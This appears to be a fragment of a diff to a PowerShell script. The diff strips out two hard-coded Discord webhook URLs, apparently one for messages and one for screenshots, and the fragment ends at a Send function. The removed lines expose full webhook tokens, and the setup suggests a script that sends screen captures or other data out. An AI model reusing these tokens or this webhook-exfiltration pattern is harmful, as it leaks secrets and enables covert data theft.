@@ -1,7 +1,7 @@
 [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing"); [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
 
-$uri = "https://discord.com/api/webhooks/1500145181339422810/A-JxEsoaoYWmlqDHKrnzI5MbMniVY0DMntXRWnKHv7UQo4aA3yMNv9jrS5fH2ODjPjGA"
-$ssuri = "https://discord.com/api/webhooks/1500577678162399423/EBgU9eoNByVZQvaxrVwMqjLEkIL7-adL_FJcD9PD0Z60N5QYfeTX62zAbo9LhQF82vO5"
+$uri = ""
+$ssuri = ""
 
 function Send {
     param ($content)
